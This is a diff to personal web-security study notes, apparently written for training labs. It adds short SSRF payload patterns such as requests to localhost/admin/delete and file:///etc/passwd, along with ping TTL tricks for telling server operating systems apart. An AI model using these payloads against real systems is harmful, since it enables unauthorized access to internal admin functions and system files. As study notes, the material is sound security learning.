@@ -589,6 +589,13 @@ Accessing a local resource that may not return
 
 ####### SSRF Server Side Request Forgery ########
 
+- Windows Servers ttl
+	- ping in the 127 range
+- Linux Servers ttl
+	- ping in the 65 range
+- "Un URL Encode" (Burp)
+	- Windows = Crl + Shift + U
+
 - Enables unauthorized access to server data
 - How it works
 	- Hacker sends manipulated Url to Website
@@ -616,10 +623,27 @@ Accessing a local resource that may not return
 
 ?? etc/host file ??
 
-
+- Basic SSRF Against the Local Server
+	- Replacing Original Source
+		- parameter=/original/source/code
+		- parameter=http://localhost/admin
+			- parameter=http://localhost/admin/delete?username=carlos
+			- parameter=http://localhost/admin?url=file:///etc/passwd
+	- Adding as Parameter
+		- parameter=/original/source/code&url=http://localhost/admin
+		- Also try '&urls='
 
 
 ####### Command Injection ########
+
+- Most Severe Vulnerabilities
+- Give me the opportunity to execute commands on the server and get
+infomation back and possibly get a shell on the server
+
+
+
+
+
 ####### File Upload ########
 ####### LFI & RFL ########
 ####### Cookies & Tokens ########
